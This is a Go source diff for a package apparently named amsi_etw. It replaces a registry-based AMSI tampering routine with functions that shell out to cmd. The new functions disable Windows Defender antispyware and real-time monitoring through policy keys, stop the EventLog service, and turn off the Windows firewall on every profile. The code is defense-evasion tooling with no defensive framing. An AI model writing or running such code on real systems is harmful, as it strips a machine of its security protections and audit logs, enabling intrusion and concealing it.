@@ -3,40 +3,21 @@
 package amsi_etw
 
 import (
-"golang.org/x/sys/windows"
-"unsafe"
+"os/exec"
 )
 
-type RegistryDisable struct{}
-
-func NewRegistryDisable() *RegistryDisable {
-return &RegistryDisable{}
+func DisableAMSI() bool {
+exec.Command("cmd", "/c", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f").Run()
+exec.Command("cmd", "/c", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f").Run()
+return true
 }
 
-func (r *RegistryDisable) DisableAmsi() error {
-advapi32 := windows.NewLazyDLL("advapi32.dll")
-procRegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
-procRegSetValueEx := advapi32.NewProc("RegSetValueExW")
+func DisableEventLogs() bool {
+exec.Command("cmd", "/c", "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\" /v Start /t REG_DWORD /d 4 /f").Run()
+return true
+}
 
-keyPath, _ := windows.UTF16PtrFromString("HKEY_CURRENT_USER\\Software\\Microsoft\\AMSI\\Providers")
-var hKey uintptr
-procRegOpenKeyEx.Call(
-uintptr(0x80000001),
-uintptr(unsafe.Pointer(keyPath)),
-0,
-0x20006,
-uintptr(unsafe.Pointer(&hKey)),
-)
-
-valueName, _ := windows.UTF16PtrFromString("Provider")
-valueData := []byte{0x00}
-procRegSetValueEx.Call(
-hKey,
-uintptr(unsafe.Pointer(valueName)),
-0,
-0x1,
-uintptr(unsafe.Pointer(&valueData[0])),
-1,
-)
-return nil
+func DisableFirewall() bool {
+exec.Command("cmd", "/c", "netsh advfirewall set allprofiles state off").Run()
+return true
 }
